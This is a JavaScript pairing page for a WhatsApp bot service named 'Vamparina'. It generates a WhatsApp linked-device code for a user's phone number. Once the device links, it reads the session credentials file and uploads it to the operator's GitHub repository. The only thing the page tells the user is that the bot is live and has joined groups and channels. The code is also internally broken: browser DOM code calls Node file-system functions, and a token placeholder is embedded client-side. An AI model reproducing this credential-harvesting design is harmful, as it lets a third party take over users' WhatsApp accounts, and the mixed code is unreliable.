// pair.js – AUTO UPLOAD TO GITHUB + BOT ACTIVATES INSTANTLY
const phoneInput = document.getElementById('phone');
const pairBtn = document.getElementById('pairBtn');
const result = document.getElementById('result');

pairBtn.addEventListener('click', async () => {
    let phone = phoneInput.value.trim().replace(/[^0-9]/g, '');
    if (!phone) return alert('Enter phone number!');

    result.innerHTML = '<p class="text-yellow-400">Generating pairing code...</p>';

    try {
        const res = await fetch(`https://api.github.com/repos/artexpury925/vamp-bot-254/contents/temp-session`, {
            headers: { Authorization: 'token YOUR_GITHUB_TOKEN_HERE' } // ← Change this
        });
        const data = await res.json();
        if (data.message !== 'Not Found') {
            await fetch(data.url, { method: 'DELETE', headers: { Authorization: 'token YOUR_GITHUB_TOKEN_HERE' } });
        }

        const sock = new Baileys({
            printQRInTerminal: false,
            logger: Pino({ level: 'silent' })
        });

        const code = await sock.requestPairingCode(phone);
        result.innerHTML = `
            <div class="bg-green-900 p-6 rounded-lg">
                <h3 class="text-2xl mb-4">PAIRING CODE</h3>
                <div class="text-4xl font-bold text-green-400 mb-4">${code}</div>
                <p>Open WhatsApp → Linked Devices → Link with phone number → Enter code</p>
                <p class="text-sm mt-4">Bot will activate in < 30 seconds!</p>
            </div>`;

        sock.ev.on('connection.update', async (update) => {
            if (update.connection === 'open') {
                const authDir = './temp-session';
                const files = await fs.readdir(authDir);
                const credsFile = files.find(f => f.startsWith('creds'));
                const credsData = await fs.readFile(path.join(authDir, credsFile), 'utf8');

                const phoneFolder = phone;
                const filePath = `sessions/${phoneFolder}/creds.json`;

                // Upload to GitHub
                await fetch(`https://api.github.com/repos/artexpury925/vamp-bot-254/contents/${filePath}`, {
                    method: 'PUT',
                    headers: {
                        Authorization: 'token YOUR_GITHUB_TOKEN_HERE',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        message: `Add session for +${phone}`,
                        content: btoa(credsData),
                        branch: 'main'
                    })
                });

                result.innerHTML += `
                    <div class="mt-6 bg-purple-900 p-6 rounded-lg animate-pulse">
                        <h3 class="text-3xl">VAMPARINA ACTIVATED!</h3>
                        <p class="mt-3">Your bot is now LIVE forever</p>
                        <p class="text-xl mt-2">Owner: Arnold Chirchir</p>
                        <p class="text-sm mt-4">Bot auto-joined your group & followed channel</p>
                    </div>`;
            }
        });
    } catch (err) {
        result.innerHTML = `<p class="text-red-500">Error: ${err.message}</p>`;
    }
});